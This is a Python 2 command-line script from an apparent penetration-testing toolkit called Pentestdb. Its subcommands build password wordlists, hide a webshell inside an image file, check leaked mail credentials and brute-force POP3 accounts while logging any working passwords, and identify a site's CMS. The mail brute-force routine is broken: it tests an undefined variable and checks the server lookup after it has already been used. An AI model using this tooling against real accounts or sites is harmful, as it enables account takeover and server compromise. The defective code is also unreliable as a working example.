#!/usr/local/env python
#coding: UTF-8

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''


import sys
import argparse
import os
import poplib

from script.commons import Database, PenError, DictError, WordList, Log
from script.mail import getMailServers, checkMail
from script.cms import CMSIdentify

reload(sys)
sys.setdefaultencoding("utf-8")


#================================sub commands=====================================

def doDictParse(args):
    db = Database(args.database)

    if args.generate:
        db.generate(args.generate)
    elif args.wordlist:
        db.addWordlist(args.wordlist)

        db.dump()


def doGenPicShell(args):
    with open(args.pic, "rb") as fd:
        picData = fd.read()
    with open(args.shell, "rb") as fd:
        shellData = fd.read()
    with open(args.dest, "wb") as fd:
        fd.write(picData)
        fd.write(shellData)


def doMailChecks(args):
    log = Log()
    mailServers = getMailServers(os.path.join("script","mail_server.json"))
    for line in WordList(args.file):
        info = line.split()
        if len(info) < 2:
            continue
        user = info[0].strip()
        passwd = info[2].strip() if len(info)==3 else info[1].strip()

        serverStr = user.split("@")[1].strip()
        serverInfo = mailServers.get(serverStr, None)
        server = args.server if args.server else serverInfo['server']
        if not server:
            continue
        port = args.port if args.port else serverInfo.get('port',None)

        log.info("checking '{0}' '{1}' '{2}'".format(user, passwd, server))
        if checkMail(server, user, passwd, port=port):
            log.warning("success, user is {0}, password is {1}".format(user,passwd))


def doMailBrute(args):
    log = Log()
    mailServers = getMailServers(os.path.join("script","mail_server.json"))

    users = WordList(args.user[1:]) if args.user.startswith("@") else [args.user]
    passwords = WordList(args.passwd[1:]) if args.passwd.startswith("@") else [args.passwd]

    for user in users:
        for password in passwords:
            server = user.split("@")[1].strip()
            server = mailServers.get(server, None)
            ssl = mailServers.get('ssl', False)
            port = server.get('port',None)
            if not server:
                continue

            log.info("checking '{0}' '{1}' '{2}'".format(user, passwd, server['server']))
            
            if checkMail(server['server'], user, passwd, ssl=ssl, port=port):
                log.warning("success, user is {0}, password is {1}".format(user,passwd))


def doCMSIdentify(args):
    cms = CMSIdentify(args.url)
    cms.identify()

#=====================================main================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(title="subcommands", description="use subcommands")

    # dbparse, add wordlist to database and generate new wordlists
    dbparse = subparser.add_parser("db", help="parse database, add wordlist to database, dump wordlist from database")
    dbparse.add_argument("database", help="specified the database file.")
    dbparse.add_argument("-g", "--generate", help="specified the size and generate a wordlist.", type=int)
    dbparse.add_argument("-w", "--wordlist", help="add a specified wordlist to database.")
    dbparse.set_defaults(func=doDictParse)

    # picshell, generate a picture webshell
    picshell = subparser.add_parser("picshell", help="generate picture webshell")
    picshell.add_argument("pic", help="specified the picture file or other files to contain the webshell.")
    picshell.add_argument("shell", help="specified the shell file.")
    picshell.add_argument("dest", help="specified the output file.")
    picshell.set_defaults(func=doGenPicShell)

    # mailcheck, check and find useful mail accounts
    mailcheck = subparser.add_parser("mailcheck", help="check and find useful mail accounts")
    mailcheck.add_argument("file", help="specified wordlist, wordlist format is 'xx@xx.com passwd'")
    mailcheck.add_argument("-s", "--server", help="specified the POP3 server.")  
    mailcheck.add_argument("-c", "--ssl", help="use ssl", action="store_true")
    mailcheck.add_argument("-p", "--port", help="specified the port", type=int)
    mailcheck.set_defaults(func=doMailChecks)

    # mail bruteforce
    mailbrute = subparser.add_parser("mailbrute", help="mail account brute force")
    mailbrute.add_argument("user", help="specified the user of the mail account, use @file to specify user wordlist")
    mailbrute.add_argument("passwd", help="specified the password of the mail account, use @file to specify password wordlist")
    mailbrute.add_argument("-s","--server", help="specified the POP3 server.")  
    mailbrute.add_argument("-c","--ssl", help="use ssl", action="store_true")
    mailbrute.add_argument("-p","--port", help="specified the port", type=int)
    mailbrute.set_defaults(func=doMailBrute)

    # cms identify
    cms = subparser.add_parser("cms", help="indentify the cms type")
    cms.add_argument("url", help="specified the URL of target.")
    cms.set_defaults(func=doCMSIdentify)


    args = parser.parse_args()
    args.func(args)


